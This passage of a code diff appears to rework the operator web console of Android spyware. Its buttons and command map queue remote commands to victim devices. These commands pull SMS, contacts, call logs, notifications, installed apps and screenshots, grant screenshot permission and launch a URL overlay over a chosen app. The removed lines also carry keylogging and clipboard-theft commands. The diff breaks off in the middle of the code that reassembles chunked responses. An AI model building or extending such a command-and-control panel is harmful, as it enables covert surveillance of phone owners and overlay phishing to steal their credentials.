@@ -6,94 +6,100 @@
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <style>
     :root{
-      --bg:#071226;
-      --panel:#0b2230;
-      --muted:#b6c6d0;
-      --accent:#2b8cff;
-      --accent-2:#16a34a;
-      --card:#071f29;
+      --bg: #071226;
+      --panel: #0b2230;
+      --muted: #b6c6d0;
+      --accent: #2b8cff;
+      --accent-2: #16a34a;
+      --card: #071f29;
       --glass: rgba(255,255,255,0.03);
-      --radius:12px;
+      --radius: 12px;
     }
     *{box-sizing:border-box}
-    html,body{height:100%;margin:0;font-family:Inter,ui-sans-serif,system-ui,-apple-system,"Segoe UI",Roboto,Arial;color:var(--muted);background:linear-gradient(180deg,#051223 0%, #081827 100%);}
-    .app{display:grid;grid-template-columns:260px 1fr 340px;gap:18px;height:100vh;padding:18px;}
-    /* Sidebar */
-    .sidebar{background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));border-radius:var(--radius);padding:18px;border:1px solid rgba(255,255,255,0.03);display:flex;flex-direction:column;gap:12px;overflow:auto}
+    html,body{height:100%;margin:0;font-family:Inter,system-ui,-apple-system,Segoe UI,Roboto,Arial;color:var(--muted);background:linear-gradient(180deg,#051223 0%, #081827 100%);}
+    .app { display:grid; grid-template-columns: 260px 1fr 360px; gap:18px; height:100vh; padding:18px; }
+    /* SIDEBAR */
+    .sidebar{ background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01)); border-radius:var(--radius); padding:18px; border:1px solid rgba(255,255,255,0.02); display:flex;flex-direction:column; gap:12px; overflow:auto;}
     .logo{font-weight:700;color:var(--accent);font-size:18px}
     .meta{font-size:13px;color:#9fb0bd}
-    .badge{padding:6px 10px;border-radius:999px;font-weight:700;font-size:13px;display:inline-block}
+    .badge{padding:6px 10px;border-radius:999px;font-weight:700;font-size:13px}
     .offline{background:rgba(255,255,255,0.03);color:#7ea2b9}
     .online{background:linear-gradient(90deg,#0ea5a4,#16a34a);color:white}
-    .group{margin-top:6px}
+    .group{margin-top:10px}
     .group h4{margin:8px 0;color:#92b3c6;font-size:13px}
-    .btn{background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));color:white;border:1px solid rgba(255,255,255,0.04);padding:10px 14px;border-radius:10px;font-weight:700;font-size:14px;cursor:pointer;min-width:120px;text-align:center;margin-bottom:8px}
+    .actions{display:flex;flex-wrap:wrap;gap:8px}
+    .btn{background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01)); color:white;border:1px solid rgba(255,255,255,0.04); padding:10px 12px;border-radius:10px;font-weight:700;cursor:pointer; min-width:120px; text-align:center;}
     .btn.ghost{background:transparent;border:1px solid rgba(255,255,255,0.03);color:var(--muted)}
     .btn.green{background:linear-gradient(90deg,var(--accent-2),#059669)}
     .btn.blue{background:linear-gradient(90deg,var(--accent),#1e40af)}
     .btn.red{background:linear-gradient(90deg,#ef4444,#dc2626)}
     .input{width:100%;padding:10px;border-radius:10px;border:1px solid rgba(255,255,255,0.03);background:rgba(255,255,255,0.02);color:var(--muted);font-size:14px}
-    /* main area */
+    /* MAIN */
     .main{display:flex;flex-direction:column;gap:14px}
     .header{display:flex;align-items:center;justify-content:space-between;padding:12px 18px;border-radius:12px;background:linear-gradient(180deg, rgba(255,255,255,0.01), rgba(255,255,255,0.015));border:1px solid rgba(255,255,255,0.02);}
     .title{font-weight:700;color:#87c0ff}
     .clientInfo{color:#a8c3d6}
-    .content{display:grid;grid-template-columns:1fr;gap:18px;align-items:start}
-    .card{background:var(--panel);border-radius:12px;padding:16px;border:1px solid rgba(255,255,255,0.02);min-height:420px}
-    .tabs{display:flex;gap:12px;margin-bottom:12px;flex-wrap:wrap}
+    .content{display:grid;grid-template-columns:1fr;gap:18px}
+    .card{background:var(--panel);border-radius:12px;padding:16px;border:1px solid rgba(255,255,255,0.02);min-height:220px}
+    .tabs{display:flex;gap:10px;margin-bottom:12px;flex-wrap:wrap}
     .tab{padding:8px 12px;border-radius:999px;background:rgba(255,255,255,0.01);color:#9fb0bd;font-weight:700;cursor:pointer}
     .tab.active{background:linear-gradient(90deg,#183648,#0f3a4a);color:#bfe6ff}
-    /* log */
-    #log{background:#071a21;border-radius:10px;padding:14px;height:420px;overflow:auto;font-family:monospace;color:#9fb0bd;font-size:13px;white-space:pre-wrap}
-    /* right column */
-    .rightPanel{background:linear-gradient(180deg, rgba(255,255,255,0.01), rgba(255,255,255,0.02));border-radius:12px;padding:16px;border:1px solid rgba(255,255,255,0.02);height:calc(100vh - 36px);overflow:auto}
-    .shotsGrid{display:grid;grid-template-columns:1fr;gap:12px}
+    /* Log */
+    #log{background:#071a21;border-radius:10px;padding:14px;height:420px;overflow:auto;font-family:monospace;color:#9fb0bd;font-size:13px}
+    /* Right column */
+    .rightPanel{background:linear-gradient(180deg, rgba(255,255,255,0.01), rgba(255,255,255,0.015));border-radius:12px;padding:16px;border:1px solid rgba(255,255,255,0.02);overflow:auto}
+    .shotsGrid{display:grid;gap:12px}
     .shot{background:linear-gradient(180deg, rgba(255,255,255,0.01), rgba(255,255,255,0.015));padding:12px;border-radius:10px;border:1px solid rgba(255,255,255,0.02);display:flex;flex-direction:column;gap:8px}
     .shot img{width:100%;height:auto;border-radius:8px;object-fit:cover}
-    .smallMuted{font-size:12px;color:#8ea3b4}
-    /* lists */
-    .list{display:flex;flex-direction:column;gap:8px;max-height:380px;overflow:auto;padding-right:6px}
-    .listItem{background:rgba(255,255,255,0.01);border-radius:8px;padding:10px;border:1px solid rgba(255,255,255,0.02);display:flex;justify-content:space-between;gap:12px;align-items:center}
-    .listItem pre{margin:0;font-family:monospace;font-size:13px;color:#cfe9ff;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
-    .loading{opacity:0.9;font-style:italic;color:#9fb0bd}
-    /* responsive */
-    @media (max-width: 1000px){.app{grid-template-columns:1fr;grid-template-rows:auto 1fr auto;padding:12px}.rightPanel{order:3;height:auto}.sidebar{order:1}.main{order:2}}
+    .metaSmall{font-size:12px;color:#8ea3b4}
+    /* tables / lists */
+    table.kv{width:100%;border-collapse:collapse;color:var(--muted)}
+    table.kv td{padding:8px;border-bottom:1px dashed rgba(255,255,255,0.03)}
+    ul.list{list-style:none;padding:0;margin:0;display:grid;gap:8px}
+    li.item{background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;border:1px solid rgba(255,255,255,0.01);display:flex;justify-content:space-between;align-items:center}
+    .muted{color:#8ea3b4;font-size:13px}
+    .loader{font-style:italic;color:#9fb0bd}
+    @media (max-width:1000px){
+      .app{grid-template-columns:1fr;grid-template-rows:auto 1fr auto}
+      .rightPanel{order:3}
+    }
   </style>
 </head>
 <body>
   <div class="app">
     <!-- LEFT SIDEBAR -->
     <aside class="sidebar">
-      <div>
-        <div class="logo">Device</div>
-        <div style="height:8px"></div>
-        <div class="meta">ID: <span id="devId">unknown</span></div>
-        <div style="height:6px"></div>
-        <div><span id="status" class="badge offline">Offline</span></div>
+      <div style="display:flex;align-items:center;justify-content:space-between;">
+        <div>
+          <div class="logo">Device Control</div>
+          <div class="meta">ID: <span id="devId">-</span></div>
+        </div>
+        <div>
+          <div id="status" class="badge offline">Offline</div>
+        </div>
       </div>
 
       <div class="group">
         <h4>Quick actions</h4>
-        <button id="btnFetch" class="btn blue">Fetch Notification</button>
-        <button id="btnStartNotify" class="btn green">Start Notify</button>
-        <button id="btnStopNotify" class="btn ghost">Stop Notify</button>
-
-        <button id="btnFetchSms" class="btn">Fetch SMS</button>
-        <button id="btnFetchContact" class="btn">Fetch Contacts</button>
-        <button id="btnFetchLog" class="btn">Fetch Calls</button>
-        <button id="btnFetchApps" class="btn">Fetch Installed Apps</button>
-        <button id="btnFetchDevice" class="btn">Device Info</button>
-        <button id="btnFetchScreenshot" class="btn">Fetch Screenshot</button>
-        <button id="btnFetchScreenshotPermission" class="btn">Grant Screenshot Permission</button>
+        <div class="actions">
+          <button id="btnFetch" class="btn blue">Fetch Notification</button>
+          <button id="btnStartNotify" class="btn green">Start Notify</button>
+          <button id="btnStopNotify" class="btn ghost">Stop Notify</button>
+          <button id="btnFetchSms" class="btn">Fetch SMS</button>
+          <button id="btnFetchContact" class="btn">Fetch Contacts</button>
+          <button id="btnFetchLog" class="btn">Fetch Calls</button>
+          <button id="btnFetchApps" class="btn">Fetch Apps</button>
+          <button id="btnFetchDevice" class="btn">Device Info</button>
+        </div>
       </div>
 
       <div class="group">
         <h4>Overlay</h4>
         <label style="font-size:13px;color:#8ea3b4">Package</label>
-        <input id="pkgInput" class="input" placeholder="com.example.app" />
+        <input id="pkgInput" class="input" placeholder="com.example.app">
         <label style="font-size:13px;color:#8ea3b4">URL</label>
-        <input id="urlInput" class="input" placeholder="https://..." />
-        <div style="display:flex;gap:8px;margin-top:8px">
+        <input id="urlInput" class="input" placeholder="https://...">
+        <div style="display:flex;gap:8px;margin-top:8px;">
           <button id="btnCustomOverlay" class="btn blue">Start Overlay</button>
           <button id="btnStopOverlay" class="btn ghost">Stop Overlay</button>
         </div>
@@ -113,77 +119,75 @@
           <div class="clientInfo">Client: <span id="devName">unknown</span></div>
         </div>
         <div style="display:flex;gap:12px;align-items:center">
-          <div style="font-size:13px;color:#90b1c6">Status</div>
+          <div class="muted">Status</div>
           <div id="statusSmall" class="badge offline">Offline</div>
         </div>
       </div>
 
       <div class="content">
-        <section class="card">
-          <div class="tabs" role="tablist" aria-label="Console tabs">
+        <div class="card">
+          <div class="tabs" id="tabsRow">
             <div class="tab active" data-tab="logs">Logs</div>
             <div class="tab" data-tab="apps">Apps</div>
             <div class="tab" data-tab="sms">SMS</div>
             <div class="tab" data-tab="contacts">Contacts</div>
             <div class="tab" data-tab="calls">Calls</div>
+            <div class="tab" data-tab="device">Device Info</div>
             <div class="tab" data-tab="screenshots">Screenshots</div>
           </div>
 
-          <!-- LOGS -->
-          <div id="tab-logs" class="tabPanel">
-            <div id="log">Connecting...</div>
+          <div id="viewLogs" class="view">
+            <pre id="log">Connecting...</pre>
           </div>
 
-          <!-- APPS -->
-          <div id="tab-apps" class="tabPanel" style="display:none">
-            <div id="appsLoading" class="loading" style="display:none">Loading apps...</div>
-            <div id="appsList" class="list"></div>
+          <div id="viewApps" class="view" style="display:none">
+            <div id="appsLoading" class="loader">Idle</div>
+            <ul id="appsList" class="list" style="margin-top:12px"></ul>
           </div>
 
-          <!-- SMS -->
-          <div id="tab-sms" class="tabPanel" style="display:none">
-            <div id="smsLoading" class="loading" style="display:none">Loading SMS...</div>
-            <div id="smsList" class="list"></div>
+          <div id="viewSms" class="view" style="display:none">
+            <div id="smsLoading" class="loader">Idle</div>
+            <ul id="smsList" class="list" style="margin-top:12px"></ul>
           </div>
 
-          <!-- CONTACTS -->
-          <div id="tab-contacts" class="tabPanel" style="display:none">
-            <div id="contactsLoading" class="loading" style="display:none">Loading contacts...</div>
-            <div id="contactsList" class="list"></div>
+          <div id="viewContacts" class="view" style="display:none">
+            <div id="contactsLoading" class="loader">Idle</div>
+            <ul id="contactsList" class="list" style="margin-top:12px"></ul>
           </div>
 
-          <!-- CALLS -->
-          <div id="tab-calls" class="tabPanel" style="display:none">
-            <div id="callsLoading" class="loading" style="display:none">Loading calls...</div>
-            <div id="callsList" class="list"></div>
+          <div id="viewCalls" class="view" style="display:none">
+            <div id="callsLoading" class="loader">Idle</div>
+            <ul id="callsList" class="list" style="margin-top:12px"></ul>
           </div>
 
-          <!-- SCREENSHOTS (main center area also shows thumbnails) -->
-          <div id="tab-screenshots" class="tabPanel" style="display:none">
-            <div id="shotsLoading" class="loading" style="display:none">Loading screenshots...</div>
-            <div id="screenshotsCenter" class="shotsGrid"></div>
+          <div id="viewDevice" class="view" style="display:none">
+            <div id="deviceLoading" class="loader">Idle</div>
+            <table id="deviceTable" class="kv" style="margin-top:12px"></table>
           </div>
-        </section>
+
+          <div id="viewScreenshots" class="view" style="display:none">
+            <div class="muted">Screenshots appear on the right panel</div>
+          </div>
+        </div>
       </div>
     </main>
 
-    <!-- RIGHT RAIL -->
+    <!-- RIGHT PANEL (screenshots) -->
     <aside class="rightPanel">
-      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">
+      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
         <div style="font-weight:700;color:#dbefff">Screenshots</div>
-        <div class="smallMuted">Auto saved</div>
+        <div class="muted">Auto saved</div>
       </div>
       <div id="screenshotsContainer" class="shotsGrid"></div>
     </aside>
   </div>
 
   <script>
-    // --- Extract device info from URL ---
+    // --- Basic device info from URL ---
     const pathParts = window.location.pathname.split("/");
     const clientId = pathParts[pathParts.length - 1] || "unknown";
     const urlParams = new URLSearchParams(location.search);
     const deviceName = decodeURIComponent(urlParams.get("name") || clientId);
-
     document.title = deviceName;
     document.getElementById("devName").textContent = deviceName;
     document.getElementById("devId").textContent = clientId;
@@ -192,290 +196,134 @@
     const logEl = document.getElementById("log");
     const statusEl = document.getElementById("status");
     const statusSmallEl = document.getElementById("statusSmall");
-    const tabs = Array.from(document.querySelectorAll(".tab"));
-    const tabPanels = {
-      logs: document.getElementById("tab-logs"),
-      apps: document.getElementById("tab-apps"),
-      sms: document.getElementById("tab-sms"),
-      contacts: document.getElementById("tab-contacts"),
-      calls: document.getElementById("tab-calls"),
-      screenshots: document.getElementById("tab-screenshots")
+
+    // Tab views
+    const tabsRow = document.getElementById("tabsRow");
+    const views = {
+      logs: document.getElementById("viewLogs"),
+      apps: document.getElementById("viewApps"),
+      sms: document.getElementById("viewSms"),
+      contacts: document.getElementById("viewContacts"),
+      calls: document.getElementById("viewCalls"),
+      device: document.getElementById("viewDevice"),
+      screenshots: document.getElementById("viewScreenshots")
     };
 
-    // lists
+    // lists & loaders
     const appsList = document.getElementById("appsList");
-    const smsList = document.getElementById("smsList");
-    const contactsList = document.getElementById("contactsList");
-    const callsList = document.getElementById("callsList");
-    const screenshotsContainer = document.getElementById("screenshotsContainer");
-    const screenshotsCenter = document.getElementById("screenshotsCenter");
-
-    // loading indicators
     const appsLoading = document.getElementById("appsLoading");
+    const smsList = document.getElementById("smsList");
     const smsLoading = document.getElementById("smsLoading");
+    const contactsList = document.getElementById("contactsList");
     const contactsLoading = document.getElementById("contactsLoading");
+    const callsList = document.getElementById("callsList");
     const callsLoading = document.getElementById("callsLoading");
-    const shotsLoading = document.getElementById("shotsLoading");
+    const deviceTable = document.getElementById("deviceTable");
+    const deviceLoading = document.getElementById("deviceLoading");
+    const screenshotsContainer = document.getElementById("screenshotsContainer");
 
+    // --- Utilities ---
     function pushLog(msg) {
       const ts = new Date().toLocaleTimeString();
       logEl.textContent += `\n[${ts}] ${msg}`;
       logEl.scrollTop = logEl.scrollHeight;
     }
 
-    // --- send command ---
     async function sendCmd(cmd) {
-      pushLog(`📤 Sending "${cmd}"...`);
+      pushLog(`📤 Queuing "${cmd}"...`);
       try {
         const r = await fetch("/command", {
           method: "POST",
-          headers: {"Content-Type": "application/json"},
+          headers: {"Content-Type":"application/json"},
           body: JSON.stringify({ targetClientId: clientId, command: cmd })
         });
-        if (!r.ok) pushLog(`❌ Failed: ${r.status}`);
-        else pushLog(`✅ Command queued (${cmd})`);
+        if (!r.ok) pushLog(`❌ Failed to queue: ${r.status}`);
+        else pushLog(`✅ Command queued: ${cmd}`);
       } catch (e) {
         pushLog(`⚠️ Network error: ${e.message}`);
       }
     }
 
-    // map buttons to commands + auto-tab behavior
-    const buttonMap = {
-      btnFetch: { cmd: "fetch", tab: "logs" },
-      btnStartNotify: { cmd: "start-notify", tab: "logs" },
-      btnStopNotify: { cmd: "stop-notify", tab: "logs" },
-      btnFetchSms: { cmd: "fetch-sms", tab: "sms", loader: smsLoading },
-      btnFetchContact: { cmd: "fetch-contact", tab: "contacts", loader: contactsLoading },
-      btnFetchLog: { cmd: "fetch-logs", tab: "calls", loader: callsLoading },
-      btnFetchApps: { cmd: "fetch-apps", tab: "apps", loader: appsLoading },
-      btnFetchIp: { cmd: "fetch-ip", tab: "logs" },
-      btnFetchClip: { cmd: "fetch-clip", tab: "logs" },
-      btnStartKeyLog: { cmd: "start_keylog", tab: "logs" },
-      btnStopKeyLog: { cmd: "stop_keylog", tab: "logs" },
-      btnFetchKeyLog: { cmd: "fetch_keylog", tab: "logs" },
-      btnFetchDevice: { cmd: "fetch-device", tab: "logs" },
-      btnFetchScreenshot: { cmd: "fetch-screenshot", tab: "screenshots", loader: shotsLoading },
-      btnFetchScreenshotPermission: { cmd: "grant-screenshot-permission", tab: "logs" },
-      btnUpload: { cmd: "upload", tab: "logs" },
-      btnCustomOverlay: { cmd: null, tab: "logs" }, // custom handled below
-      btnStopOverlay: { cmd: "stop-overlay", tab: "logs" }
-    };
+    // --- Tab behavior ---
+    function setActiveTab(tabName) {
+      // update tab button classes
+      for (const t of tabsRow.querySelectorAll(".tab")) {
+        t.classList.toggle("active", t.dataset.tab === tabName);
+      }
+      // show/hide views
+      for (const k in views) {
+        views[k].style.display = (k === tabName ? "" : "none");
+      }
+    }
 
-    // attach listeners for mapped buttons
-    Object.keys(buttonMap).forEach(id => {
+    tabsRow.addEventListener("click", (ev) => {
+      const tab = ev.target.closest(".tab");
+      if (!tab) return;
+      setActiveTab(tab.dataset.tab);
+    });
+
+    // --- wire up buttons (keeps original commands map) ---
+    const map = {
+      btnFetch: 'fetch',
+      btnStartNotify: 'start-notify',
+      btnStopNotify: 'stop-notify',
+      btnFetchSms: 'fetch-sms',
+      btnFetchContact: 'fetch-contact',
+      btnFetchLog: 'fetch-logs',
+      btnFetchApps: 'fetch-apps',
+      btnFetchDevice: 'fetch-device',
+      btnFetchScreenshot: 'fetch-screenshot',
+      btnFetchScreenshotPermission: 'grant-screenshot-permission',
+      btnUpload: 'upload'
+    };
+    Object.keys(map).forEach(id=>{
       const el = document.getElementById(id);
       if (!el) return;
-      el.addEventListener("click", () => {
-        const map = buttonMap[id];
-        // custom overlay button uses inputs
-        if (id === "btnCustomOverlay") {
-          const pkg = document.getElementById("pkgInput").value.trim();
-          const url = document.getElementById("urlInput").value.trim();
-          if (!pkg || !url) { pushLog("⚠️ Please enter both Package and URL"); return; }
-          const cmd = `start-overlay{url:${url},PackageName:${pkg}}`;
-          showTab(map.tab || "logs"); sendCmd(cmd);
-          return;
+      el.addEventListener("click", ()=>{
+        const cmd = map[id];
+        // special: set tab and loading states for data fetches
+        if (cmd === 'fetch-apps') {
+          setActiveTab('apps'); appsLoading.textContent = 'Loading apps...'; appsList.innerHTML = '';
+        } else if (cmd === 'fetch-sms') {
+          setActiveTab('sms'); smsLoading.textContent = 'Loading SMS...'; smsList.innerHTML = '';
+        } else if (cmd === 'fetch-contact') {
+          setActiveTab('contacts'); contactsLoading.textContent = 'Loading contacts...'; contactsList.innerHTML = '';
+        } else if (cmd === 'fetch-logs') {
+          setActiveTab('calls'); callsLoading.textContent = 'Loading calls...'; callsList.innerHTML = '';
+        } else if (cmd === 'fetch-device') {
+          setActiveTab('device'); deviceLoading.textContent = 'Loading device info...'; deviceTable.innerHTML = '';
+        } else if (cmd === 'fetch-screenshot') {
+          // switch to screenshots (right panel message)
+          setActiveTab('screenshots');
         }
-        if (map.loader) {
-          map.loader.style.display = "block";
-        }
-        if (map.tab) showTab(map.tab);
-        if (map.cmd) sendCmd(map.cmd);
+        sendCmd(cmd);
       });
     });
 
-    document.getElementById("btnClose")?.addEventListener("click", ()=> window.close());
+    document.getElementById('btnCustomOverlay')?.addEventListener('click', ()=>{
+      const pkg = document.getElementById('pkgInput').value.trim();
+      const url = document.getElementById('urlInput').value.trim();
+      if (!pkg || !url) { pushLog('⚠️ Please enter both PackageName and URL'); return; }
+      sendCmd(`start-overlay{url:${url},PackageName:${pkg}}`);
+    });
+    document.getElementById('btnStopOverlay')?.addEventListener('click', ()=>sendCmd('stop-overlay'));
+    document.getElementById('btnClose')?.addEventListener('click', ()=>window.close());
 
-    // tab switching
-    function showTab(name) {
-      // set tabs UI
-      tabs.forEach(t => {
-        if (t.dataset.tab === name) t.classList.add("active");
-        else t.classList.remove("active");
-      });
-      // show panels
-      Object.keys(tabPanels).forEach(k => {
-        tabPanels[k].style.display = (k === name ? "" : "none");
-      });
-    }
-    tabs.forEach(t => t.addEventListener("click", ()=> showTab(t.dataset.tab)));
-
-    // --- WebSocket for live updates ---
+    // --- WebSocket & chunk reassembly ---
     const wsProto = location.protocol === "https:" ? "wss://" : "ws://";
     const ws = new WebSocket(wsProto + location.host);
+
+    // chunk buffers keyed by deviceName (as sent in the chunk tag)
+    const chunkBuffers = {}; // deviceName -> { total: N, parts: {i: "text"} }
 
     ws.onopen = () => pushLog("🔌 WebSocket connected");
     ws.onclose = () => pushLog("❌ WebSocket disconnected");
     ws.onerror = (e) => pushLog("⚠️ WebSocket error");
 
-    // chunk assembly storage
-    const chunkBuffer = new Map();
-    // key: `${clientId}|${tagId}` -> { total:int, parts:[], received:int, lastTs:Date }
-
-    // utility: attempt to parse JSON safely
-    function tryParseJSON(text) {
-      try { return JSON.parse(text); } catch(e){ return null; }
-    }
-
-    function normalizeAppEntry(a) {
-      // handle different shapes of app entries
-      if (typeof a === "string") return { label: a, pkg: a };
-      if (a.packageName) return { label: a.label || a.packageName, pkg: a.packageName };
-      if (a.package) return { label: a.name || a.package, pkg: a.package };
-      if (a.appName) return { label: a.appName, pkg: a.pkg || a.package || "" };
-      return { label: a.name || a.label || JSON.stringify(a), pkg: a.package || a.pkg || "" };
-    }
-
-    // rendering functions
-    function renderApps(arr) {
-      appsLoading.style.display = "none";
-      appsList.innerHTML = "";
-      if (!arr || !arr.length) { appsList.innerHTML = "<div class='smallMuted'>No apps received</div>"; return; }
-      arr.forEach(a => {
-        const n = normalizeAppEntry(a);
-        const item = document.createElement("div"); item.className = "listItem";
-        const left = document.createElement("div"); left.style.flex = "1";
-        const title = document.createElement("pre"); title.textContent = n.label;
-        left.appendChild(title);
-        const right = document.createElement("div"); right.style.minWidth = "160px"; right.style.textAlign = "right";
-        const pkgEl = document.createElement("div"); pkgEl.className = "smallMuted"; pkgEl.textContent = n.pkg;
-        right.appendChild(pkgEl);
-        item.appendChild(left); item.appendChild(right);
-        appsList.appendChild(item);
-      });
-    }
-
-    function renderSms(arr) {
-      smsLoading.style.display = "none";
-      smsList.innerHTML = "";
-      if (!arr || !arr.length) { smsList.innerHTML = "<div class='smallMuted'>No SMS received</div>"; return; }
-      arr.forEach(s => {
-        const item = document.createElement("div"); item.className = "listItem";
-        const left = document.createElement("div"); left.style.flex = "1";
-        const who = document.createElement("div"); who.textContent = s.address || s.from || s.sender || "Unknown";
-        who.style.fontWeight = "700"; who.style.marginBottom = "6px";
-        const body = document.createElement("pre"); body.textContent = s.body || s.message || s.text || JSON.stringify(s);
-        left.appendChild(who); left.appendChild(body);
-        const right = document.createElement("div"); right.className = "smallMuted"; right.textContent = new Date(s.date || s.timestamp || Date.now()).toLocaleString();
-        item.appendChild(left); item.appendChild(right);
-        smsList.appendChild(item);
-      });
-    }
-
-    function renderContacts(arr) {
-      contactsLoading.style.display = "none";
-      contactsList.innerHTML = "";
-      if (!arr || !arr.length) { contactsList.innerHTML = "<div class='smallMuted'>No contacts received</div>"; return; }
-      arr.forEach(c => {
-        const item = document.createElement("div"); item.className = "listItem";
-        const left = document.createElement("div"); left.style.flex = "1";
-        const name = document.createElement("div"); name.textContent = c.name || c.displayName || c.fullName || JSON.stringify(c); name.style.fontWeight = "700";
-        const detail = document.createElement("div"); detail.className = "smallMuted"; detail.textContent = (c.phone || c.number || (c.phones && c.phones.join(", ")) || "");
-        left.appendChild(name); left.appendChild(detail);
-        item.appendChild(left);
-        contactsList.appendChild(item);
-      });
-    }
-
-    function renderCalls(arr) {
-      callsLoading.style.display = "none";
-      callsList.innerHTML = "";
-      if (!arr || !arr.length) { callsList.innerHTML = "<div class='smallMuted'>No call logs received</div>"; return; }
-      arr.forEach(c => {
-        const item = document.createElement("div"); item.className = "listItem";
-        const left = document.createElement("div"); left.style.flex = "1";
-        const who = document.createElement("div"); who.textContent = c.name || c.number || "Unknown"; who.style.fontWeight = "700";
-        const detail = document.createElement("pre"); detail.textContent = (c.type ? `${c.type} • ` : "") + (c.duration ? `${c.duration}s • ` : "") + (c.timestamp ? new Date(c.timestamp).toLocaleString() : "");
-        left.appendChild(who); left.appendChild(detail);
-        item.appendChild(left);
-        callsList.appendChild(item);
-      });
-    }
-
-    function renderScreenshots(urls) {
-      shotsLoading.style.display = "none";
-      if (!Array.isArray(urls)) urls = [urls];
-      // center (card) and right column
-      urls.forEach(url => {
-        const item = document.createElement("div"); item.className = "shot";
-        const img = document.createElement("img"); img.src = url; img.alt = "screenshot";
-        img.onclick = ()=> { window.open(url, "_blank"); };
-        const meta = document.createElement("div"); meta.className = "smallMuted"; meta.textContent = new Date().toLocaleString();
-        const dl = document.createElement("button"); dl.className = "btn ghost"; dl.textContent = "Download";
-        dl.addEventListener("click", async ()=> {
-          try {
-            const res = await fetch(url);
-            const blob = await res.blob();
-            const blobUrl = URL.createObjectURL(blob);
-            const a = document.createElement("a"); a.href = blobUrl; a.download = `screenshot.jpg`; document.body.appendChild(a); a.click(); a.remove(); URL.revokeObjectURL(blobUrl);
-          } catch(e){ pushLog("⚠️ Download failed: "+e.message); }
-        });
-        item.appendChild(img); item.appendChild(meta); item.appendChild(dl);
-        // prepend to both containers
-        screenshotsContainer.prepend(item.cloneNode(true));
-        screenshotsCenter.prepend(item);
-      });
-    }
-
-    // attempt to intelligently route parsed payload to a renderer
-    function routeParsedPayload(obj) {
-      // if it's an object with top-level keys
-      if (!obj) return false;
-      if (Array.isArray(obj)) {
-        // array — guess type by inspecting first element
-        const first = obj[0];
-        if (!first) return false;
-        if (first.packageName || first.package || typeof first === "string") { renderApps(obj); showTab("apps"); return true; }
-        if (first.address || first.body || first.sender) { renderSms(obj); showTab("sms"); return true; }
-        if (first.number || first.type || first.duration) { renderCalls(obj); showTab("calls"); return true; }
-        if (first.name && (first.phone || first.phones)) { renderContacts(obj); showTab("contacts"); return true; }
-        // fallback: append to logs
-        pushLog("📦 Received array payload (unknown): " + JSON.stringify(obj));
-        return false;
-      } else if (typeof obj === "object") {
-        // check known keys
-        if (obj.apps || obj.installedApps || obj.packages) {
-          const apps = obj.apps || obj.installedApps || obj.packages;
-          renderApps(apps);
-          showTab("apps");
-          return true;
-        }
-        if (obj.sms || obj.messages) {
-          const sms = obj.sms || obj.messages;
-          renderSms(sms);
-          showTab("sms");
-          return true;
-        }
-        if (obj.contacts || obj.people) {
-          const contacts = obj.contacts || obj.people;
-          renderContacts(contacts);
-          showTab("contacts");
-          return true;
-        }
-        if (obj.calls || obj.callLogs) {
-          const calls = obj.calls || obj.callLogs;
-          renderCalls(calls);
-          showTab("calls");
-          return true;
-        }
-        if (obj.screenshots || obj.images) {
-          const shots = obj.screenshots || obj.images;
-          renderScreenshots(shots);
-          showTab("screenshots");
-          return true;
-        }
-        // unknown structured object — show in logs
-        pushLog("📦 Received object payload: " + JSON.stringify(obj));
-        return false;
-      }
-      return false;
-    }
-
-    // --- Handle incoming ws messages (including chunk handling) ---
     ws.onmessage = (evt) => {
       try {
         const msg = JSON.parse(evt.data);
-        // device status updates
+        // devices payload updates status
         if (msg.type === "devices") {
           const d = msg.devices?.[clientId];
           if (d && d.online) {
@@ -485,48 +333,43 @@
             statusEl.textContent = "Offline"; statusEl.className = "badge offline";
             statusSmallEl.textContent = "Offline"; statusSmallEl.className = "badge offline";
           }
-          return;
         }
 
-        // responses
+        // handle device responses
         if (msg.type === "response" && msg.clientId === clientId) {
-          const raw = (typeof msg.output === "string") ? msg.output : String(msg.output || "");
-          pushLog(`📩 Response chunk: ${raw.substring(0,200)}`);
+          // Responses may be chunked with pattern: [DeviceName chunk i/n]\n<chunk>
+          const raw = String(msg.output || "");
+          pushLog(`📩 Response chunk: ${shorten(raw)}`);
 
-          // check chunk pattern: "[<tag> chunk X/Y]\n<content>"
-          // pattern groups: tag, index, total, content
-          const chunkRegex = /^\[(.+?)\s+chunk\s+(\d+)\/(\d+)\]\s*\n([\s\S]*)$/i;
-          const m = raw.match(chunkRegex);
-          if (m) {
-            const tag = m[1].trim(); // usually deviceName but may contain command info
-            const idx = parseInt(m[2], 10);
-            const total = parseInt(m[3], 10);
-            const content = m[4] || "";
+          // detect chunk header
+          const chunkHeaderMatch = raw.match(/^\[(.+?)\s+chunk\s+(\d+)\/(\d+)\]\s*\n([\s\S]*)/i);
+          if (chunkHeaderMatch) {
+            const deviceTag = chunkHeaderMatch[1].trim();
+            const idx = Number(chunkHeaderMatch[2]);
+            const tot = Number(chunkHeaderMatch[3]);
+            const chunkText = chunkHeaderMatch[4];
 
-            const key = clientId + "|" + tag;
-            let entry = chunkBuffer.get(key);
-            if (!entry) {
-              entry = { total: total, parts: new Array(total).fill(null), received: 0, lastTs: Date.now() };
-              chunkBuffer.set(key, entry);
-            }
-            // store at correct position (index-1)
-            if (!entry.parts[idx-1]) {
-              entry.parts[idx-1] = content;
-              entry.received++;
-              entry.lastTs = Date.now();
-            }
+            if (!chunkBuffers[deviceTag]) chunkBuffers[deviceTag] = { total: tot, parts: {} };
+            chunkBuffers[deviceTag].parts[idx] = chunkText;
+            chunkBuffers[deviceTag].total = tot;
 
-            // if complete assemble
-            if (entry.received === entry.total) {
-              const assembled = entry.parts.join("");
-              chunkBuffer.delete(key);
-              handleAssembledPayload(assembled);
+            // check if complete
+            const parts = chunkBuffers[deviceTag].parts;
+            const have = Object.keys(parts).length;
+            if (have === tot) {
+              // join in order
+              let joined = '';
+              for (let i = 1; i <= tot; i++) joined += (parts[i] || '');
+              // remove buffer
+              delete chunkBuffers[deviceTag];
+              // process joined payload
+              handleFullPayload(joined.trim());
             } else {
